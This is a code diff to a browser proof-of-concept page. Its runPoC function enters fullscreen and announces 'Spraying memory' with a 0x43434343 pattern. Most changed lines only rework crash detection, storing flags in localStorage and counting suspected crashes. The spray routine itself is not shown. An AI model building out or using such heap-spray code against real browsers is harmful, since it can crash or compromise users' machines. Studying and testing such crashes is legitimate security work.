@@ -154,17 +154,29 @@ body {
 
 <script>
 window.onload = () => {
-  const lastTime = parseInt(localStorage.getItem("crashTime") || "0");
-  const now = Date.now();
-  const elapsed = Math.floor((now - lastTime) / 1000);
+  const lastCrash = localStorage.getItem("wasAboutToCrash");
+  const lastTimestamp = localStorage.getItem("crashTimestamp");
 
-  if (lastTime && elapsed > 4) {
-    let counter = parseInt(localStorage.getItem("crashCount") || "0");
-    counter += 1;
-    localStorage.setItem("crashCount", counter.toString());
-    localStorage.removeItem("crashTime");
+  if (lastCrash === "yes" && lastTimestamp) {
+    const now = Date.now();
+    const elapsed = Math.floor((now - Number(lastTimestamp)) / 1000);
 
-    alert(`⚠️ Last run may have triggered instability or crash.\n⏱ Elapsed: ${elapsed}s\n💥 Total crashes detected: ${counter}`);
+    // Solo mostrar si han pasado más de 5 segundos (asumimos crash)
+    if (elapsed >= 5) {
+      let count = parseInt(localStorage.getItem("crashCount") || "0");
+      count++;
+      localStorage.setItem("crashCount", count.toString());
+
+      alert(
+        `⚠️ Last run may have triggered instability or crash.\n` +
+        `⏱ Elapsed: ${elapsed}s\n` +
+        `💥 Total crashes detected: ${count}`
+      );
+    }
+
+    // Reset flags
+    localStorage.removeItem("wasAboutToCrash");
+    localStorage.removeItem("crashTimestamp");
   }
 };
 
@@ -172,7 +184,8 @@ function runPoC() {
   document.getElementById("message").textContent =
     "Fullscreen activated...\nSpraying memory...";
 
-  localStorage.setItem("crashTime", Date.now().toString());
+  localStorage.setItem("wasAboutToCrash", "yes");
+  localStorage.setItem("crashTimestamp", Date.now().toString());
 
   document.body.requestFullscreen().then(() => {
     const PATTERN   = 0x43434343;
@@ -202,5 +215,6 @@ function runPoC() {
   });
 }
 </script>
+
 </body>
 </html>
